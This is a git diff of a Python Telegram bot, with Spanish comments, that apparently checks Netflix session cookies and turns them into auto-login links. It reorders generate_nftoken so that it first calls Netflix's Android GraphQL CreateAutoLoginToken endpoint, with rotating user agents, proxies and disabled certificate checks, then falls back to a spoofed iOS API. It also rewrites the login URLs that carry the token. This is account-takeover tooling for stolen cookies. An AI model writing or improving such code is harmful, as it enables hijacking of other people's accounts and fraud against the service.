@@ -18,7 +18,6 @@ import random
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 # ✅ CONFIGURACIÓN PARA RENDER
-# Busca la variable "TELEGRAM_TOKEN" en los Environment Variables de Render
 BOT_TOKEN = os.environ.get('TELEGRAM_TOKEN')
 
 if not BOT_TOKEN:
@@ -119,18 +118,56 @@ _IOS_PARAMS = {"appVersion":"15.48.1","config":'{"gamesInTrailersEnabled":"false
 _IOS_HEADERS_BASE = {"x-netflix.request.attempt":"1","x-netflix.request.client.user.guid":"A4CS633D7VCBPE2GPK2HL4EKOE","x-netflix.context.profile-guid":"A4CS633D7VCBPE2GPK2HL4EKOE","x-netflix.request.routing":'{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',"x-netflix.context.app-version":"15.48.1","x-netflix.argo.translated":"true","x-netflix.context.form-factor":"phone","x-netflix.context.sdk-version":"2012.4","x-netflix.client.appversion":"15.48.1","x-netflix.context.max-device-width":"375","x-netflix.context.ab-tests":"","x-netflix.tracing.cl.useractionid":"4DC655F2-9C3C-4343-8229-CA1B003C3053","x-netflix.client.type":"argo","x-netflix.client.ftl.esn":"NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200","x-netflix.context.locales":"en-US","x-netflix.context.top-level-uuid":"90AFE39F-ADF1-4D8A-B33E-528730990FE3","x-netflix.client.iosversion":"15.8.5","accept-language":"en-US;q=1","x-netflix.argo.abtests":"","x-netflix.context.os-version":"15.8.5","x-netflix.request.client.context":'{"appState":"foreground"}',"x-netflix.context.ui-flavor":"argo","x-netflix.argo.nfnsm":"9","x-netflix.context.pixel-density":"2.0","x-netflix.request.toplevel.uuid":"90AFE39F-ADF1-4D8A-B33E-528730990FE3"}
 
 def generate_nftoken(netflix_id_raw, timeout=15, proxy=None):
-    """Mejora: Intenta obtener un token real de login con UA rotativa."""
+    """Genera nftoken usando Android API (más estable) con fallback iOS."""
     if not netflix_id_raw: return None
     netflix_id = urllib.parse.unquote(str(netflix_id_raw))
     proxies = {"http": proxy, "https": proxy} if proxy else None
 
-    # Método 1: API iOS (Más rápido para tokens)
-    headers = dict(_IOS_HEADERS_BASE)
-    headers["Cookie"] = f"NetflixId={netflix_id}"
-    # Añadimos un UA aleatorio moderno para simular tráfico real
-    headers["User-Agent"] = random.choice(USER_AGENTS)
-
+    # 1. Intentar con API de Android (La más compatible hoy en día)
     try:
+        sess = requests.Session()
+        sess.cookies.set("NetflixId", netflix_id, domain=".netflix.com", path="/")
+        if proxies: 
+            sess.proxies = proxies
+            sess.verify = False
+        
+        # Usamos un UA de Android aleatorio
+        android_uas = [ua for ua in USER_AGENTS if "Android" in ua or "com.netflix" in ua]
+        android_ua = random.choice(android_uas) if android_uas else USER_AGENTS[0]
+        
+        payload = {
+            "operationName": "CreateAutoLoginToken",
+            "variables": {"scope": "WEBVIEW_MOBILE_STREAMING"},
+            "extensions": {
+                "persistedQueries": {
+                    "version": 102,
+                    "id": "76e97129-f4b5-41a0-a73c-12e674896849"
+                }
+            }
+        }
+        
+        headers = {
+            "User-Agent": android_ua,
+            "Content-Type": "application/json",
+            "Accept": "application/json"
+        }
+        
+        r = sess.post("https://android13.prod.ftl.netflix.com/graphql", json=payload, headers=headers, timeout=timeout)
+        
+        if r.status_code == 200:
+            d = r.json()
+            tok = (d.get("data") or {}).get("createAutoLoginToken")
+            if tok: 
+                return str(tok)
+    except Exception as e:
+        logger.debug(f"Fallo Android API: {e}")
+
+    # 2. Fallback a iOS (tu método original, por si acaso)
+    try:
+        headers = dict(_IOS_HEADERS_BASE)
+        headers["Cookie"] = f"NetflixId={netflix_id}"
+        headers["User-Agent"] = random.choice(USER_AGENTS)
+        
         r = requests.get(_IOS_API, params=_IOS_PARAMS, headers=headers, proxies=proxies, timeout=timeout, verify=False)
         if r.status_code == 200:
             data = r.json()
@@ -139,26 +176,6 @@ def generate_nftoken(netflix_id_raw, timeout=15, proxy=None):
             if tok: return str(tok)
     except: pass
 
-    # Método 2: GraphQL Android (Fallback)
-    try:
-        sess2 = requests.Session()
-        sess2.cookies.set("NetflixId", netflix_id, domain=".netflix.com", path="/")
-        if proxies: sess2.proxies, sess2.verify = proxies, False
-
-        # Rotamos el UA también aquí
-        sess2.headers.update({
-            "User-Agent": random.choice(USER_AGENTS),
-            "Accept": "application/json",
-            "Content-Type": "application/json"
-        })
-
-        payload = {"operationName":"CreateAutoLoginToken","variables":{"scope":"WEBVIEW_MOBILE_STREAMING"},"extensions":{"persistedQueries":{"version":102,"id":"76e97129-f4b5-41a0-a73c-12e674896849"}}}
-        r2 = sess2.post("https://android13.prod.ftl.netflix.com/graphql", json=payload, timeout=timeout)
-        if r2.status_code == 200:
-            d = r2.json()
-            tok = (d.get("data") or {}).get("createAutoLoginToken")
-            if tok: return str(tok)
-    except: pass
     return None
 
 def check_account(cookies: dict, proxy=None, timeout=20):
@@ -271,8 +288,9 @@ def check_account(cookies: dict, proxy=None, timeout=20):
 
     if tok:
         tok_safe = urllib.parse.quote(tok, safe="")
-        login_pc = f"https://netflix.com/?nftoken={tok_safe}"
-        login_phone = f"https://mobile.netflix.com/?nftoken={tok_safe}"
+        # URL Mejorada: usa 'login' en lugar de '/unsupported' para móviles
+        login_pc = f"https://www.netflix.com/login?nftoken={tok_safe}"
+        login_phone = f"https://www.netflix.com/login?nftoken={tok_safe}"
     else:
         login_pc, login_phone = "N/A", "N/A"
 
